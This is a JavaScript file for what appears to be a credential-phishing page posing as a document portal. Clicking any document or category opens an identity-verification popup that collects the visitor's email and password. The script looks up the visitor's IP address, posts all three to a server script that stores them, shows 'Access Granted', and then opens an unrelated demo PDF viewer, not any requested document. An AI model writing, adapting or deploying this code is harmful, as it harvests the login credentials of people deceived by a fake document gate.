document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const popupOverlay = document.getElementById('popupOverlay');
    const closePopupBtn = document.querySelector('.close-popup');
    const documentItems = document.querySelectorAll('.document-item');
    const sidebarLinks = document.querySelectorAll('.sidebar-link');
    const nextBtn1 = document.getElementById('nextBtn1');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.getElementById('backBtn');
    const formSteps = document.querySelectorAll('.form-step');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const displayedEmail = document.getElementById('displayedEmail');
    const formTitle = document.getElementById('formTitle');
    
    let currentStep = 1;
    let currentDocument = '';
    let userEmail = '';

// Add viewport adjustment for mobile devices
function adjustViewportForMobile() {
    const viewport = document.querySelector('meta[name="viewport"]');
    
    if (viewport) {
        // Adjust viewport for better mobile experience
        viewport.setAttribute('content', 
            'width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes');
    }
}

// Add this to DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
    adjustViewportForMobile();
    
    // Rest of your existing code...
});

    // Create menu toggle for mobile
    createMobileMenuToggle();
    
    // Open popup when document is clicked
documentItems.forEach(item => {
    item.addEventListener('click', function() {
        // Get document title from the clicked item
        const docTitle = this.querySelector('.document-title').textContent;
        console.log('Opening document:', docTitle);
        
        // Optional: You can pass the document title to the form if needed
        // currentDocument = docTitle;
        
        openPopup();
    });
});
    
    // Open popup when sidebar link is clicked
    sidebarLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const category = this.getAttribute('data-category');
            currentDocument = `category_${category}`;
            
            // Remove active class from all links
            sidebarLinks.forEach(l => l.classList.remove('active'));
            // Add active class to clicked link
            this.classList.add('active');
            
            // Close mobile sidebar if open
            if (window.innerWidth <= 992) {
                closeMobileSidebar();
            }
            
            // Open popup
            openPopup();
        });
    });
    
    // Open popup function
    function openPopup() {
        resetForm();
        popupOverlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }
    
    // Close popup
    closePopupBtn.addEventListener('click', closePopup);
    
    popupOverlay.addEventListener('click', function(e) {
        if (e.target === popupOverlay) {
            closePopup();
        }
    });
    
    function closePopup() {
        popupOverlay.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
    
    // Form navigation - Next button from email step
    nextBtn1.addEventListener('click', function() {
        if (validateEmail()) {
            userEmail = emailInput.value.trim();
            displayEmailInStep2(userEmail);
            showStep(2);
            updateFormTitle('Verify Your Identity');
        }
    });
    
    // Back button
    backBtn.addEventListener('click', function() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
    });
    
    // Submit button
    submitBtn.addEventListener('click', async function() {
        if (validatePassword()) {
            await submitForm();
        }
    });
    
    // Display email in step 2
    function displayEmailInStep2(email) {
        displayedEmail.textContent = email;
    }
    
    // Update form title
    function updateFormTitle(title) {
        formTitle.textContent = title;
    }
    
    // Show specific form step
    function showStep(step) {
        formSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`step${step}`).classList.add('active');
        currentStep = step;
    }
    
    // Reset form to initial state
    function resetForm() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        emailInput.value = '';
        passwordInput.value = '';
        userEmail = '';
        displayedEmail.textContent = '';
    }
    
    // Validation functions
    function validateEmail() {
        const email = emailInput.value.trim();
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        
        if (!email) {
            alert('Please enter your email address');
            return false;
        }
        
        if (!emailRegex.test(email)) {
            alert('Please enter a valid email address');
            return false;
        }
        
        return true;
    }
    
    function validatePassword() {
        const password = passwordInput.value.trim();
        
        if (!password) {
            alert('Please enter your password');
            return false;
        }
        
        if (password.length < 6) {
            alert('Password must be at least 6 characters');
            return false;
        }
        
        return true;
    }
    
// Submit form data to server
async function submitForm() {
    const submitBtn = document.getElementById('submitBtn');
    const originalText = submitBtn.textContent;
    
    try {
        // Disable button and show loading
        submitBtn.disabled = true;
        submitBtn.textContent = 'Submitting...';
        submitBtn.style.opacity = '0.7';
        
        const formData = {
            email: userEmail,
            password: passwordInput.value.trim()
        };
        
        console.log('Submitting form data:', { 
            email: formData.email, 
            passwordLength: formData.password.length 
        });
        
        // Get IP address
        let ipAddress = 'Unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;
            }
        } catch (ipError) {
            console.warn('Could not fetch IP address:', ipError);
        }
        
        formData.ip_address = ipAddress;
        
        // Send data to server
        console.log('Sending request to submit.php...');
        const response = await fetch('submit.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });
        
        console.log('Response status:', response.status);
        const result = await response.json();
        console.log('Server response:', result);
        
        if (result.success) {
            // Show success message
            showStep(3);
            updateFormTitle('Access Granted');
            
            // Log success to console
            console.log('Data stored successfully with ID:', result.insert_id);
            
            // Auto-close and redirect after 2 seconds
            setTimeout(() => {
                closePopup();
                // Redirect to PDF viewer (replace with actual URL)
                window.open('https://mozilla.github.io/pdf.js/web/viewer.html', '_blank');
            }, 2000);
        } else {
            throw new Error(result.error || 'Server returned an error');
        }
        
    } catch (error) {
        console.error('Error submitting form:', error);
        
        // Show user-friendly error message
        let errorMessage = 'There was an error submitting your information. ';
        
        if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
            errorMessage += 'Please check your internet connection and try again.';
        } else if (error.message.includes('connection')) {
            errorMessage += 'Cannot connect to server. Please try again later.';
        } else {
            errorMessage += 'Please try again.';
        }
        
        alert(errorMessage);
        
        // Re-enable button
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
        submitBtn.style.opacity = '1';
    }
}
    // Mobile menu functionality
    function createMobileMenuToggle() {
        // Create toggle button
        const toggleBtn = document.createElement('button');
        toggleBtn.className = 'menu-toggle';
        toggleBtn.innerHTML = '<i class="fas fa-bars"></i>';
        document.body.appendChild(toggleBtn);
        
        // Create overlay
        const overlay = document.createElement('div');
        overlay.className = 'sidebar-overlay';
        document.body.appendChild(overlay);
        
        // Toggle sidebar
        toggleBtn.addEventListener('click', function() {
            document.querySelector('.sidebar').classList.toggle('active');
            overlay.style.display = 'block';
        });
        
        // Close sidebar when clicking overlay
        overlay.addEventListener('click', function() {
            closeMobileSidebar();
        });
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            const sidebar = document.querySelector('.sidebar');
            if (window.innerWidth <= 992 && 
                !sidebar.contains(e.target) && 
                e.target !== toggleBtn &&
                sidebar.classList.contains('active')) {
                closeMobileSidebar();
            }
        });
        
        // Close sidebar on window resize
        window.addEventListener('resize', function() {
            if (window.innerWidth > 992) {
                closeMobileSidebar();
            }
        });
    }
    
    function closeMobileSidebar() {
        document.querySelector('.sidebar').classList.remove('active');
        document.querySelector('.sidebar-overlay').style.display = 'none';
    }
    
    // Set first sidebar link as active by default
    sidebarLinks[0].classList.add('active');
});


